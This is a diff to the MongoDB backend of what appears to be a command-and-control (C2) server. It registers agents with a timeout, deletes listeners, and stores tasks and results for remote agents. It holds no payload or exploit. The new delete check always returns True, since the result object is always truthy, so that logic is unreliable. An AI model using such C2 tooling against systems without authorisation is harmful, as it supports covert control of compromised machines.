@@ -3,10 +3,10 @@ from pymongo import MongoClient
 client = MongoClient('mongodb://localhost:27017/') 
 db = client.C2 
 
-def registerAgent(agentID, agentIP): #timeout=86400): 
+def registerAgent(agentID, agentIP, timeout=86400): 
     
     agent = {   'id': agentID,  
-                #'timeout': timeout, 
+                'timeout': timeout, 
                 'ip': agentIP,      
                 'task': '',  
                 'status': '', 
@@ -38,8 +38,10 @@ def getListeners():
 
 
 def delListener(id): 
-    db.listeners.delete_one({ 'id' : { '$eq': id } })
-    print("[*] Listener Deleted!")
+    if(db.listeners.delete_one({ 'id' : { '$eq': id } })):
+        return True
+    else: 
+        return False
 
 def checkTask(agentID): 
     task = db.agents.find_one( {'id': {'$eq': agentID} }).get('task') 
@@ -79,3 +81,4 @@ def writeResult(agentID, result):
             'taskResult': ''
         }
     }) 
+
